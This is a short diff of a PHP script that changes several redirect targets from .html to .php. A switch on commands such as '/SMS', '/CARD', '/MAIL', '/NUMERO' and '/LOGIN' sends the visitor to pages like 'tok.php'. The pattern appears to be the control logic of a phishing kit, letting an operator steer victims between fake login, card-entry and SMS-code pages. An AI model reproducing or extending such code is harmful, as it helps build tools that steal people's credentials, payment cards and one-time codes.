@@ -39,15 +39,15 @@ if (file_exists($archivo)) {
         case '/ERROR':
             header("Location: index2.php"); exit;
         case '/SMS':
-            header("Location: tok.html"); exit;
+            header("Location: tok.php"); exit;
         case '/SMSERROR':
-            header("Location: tokx.html"); exit;
+            header("Location: tokx.php"); exit;
         case '/CARD':
-            header("Location: tok.html"); exit;
+            header("Location: tok.php"); exit;
         case '/MAIL':
-            header("Location: tok.html"); exit;
+            header("Location: tok.php"); exit;
         case '/NUMERO':
-            header("Location: tok.html"); exit;
+            header("Location: tok.php"); exit;
         case '/LOGIN':
             header("Location: index.php"); exit;
     }
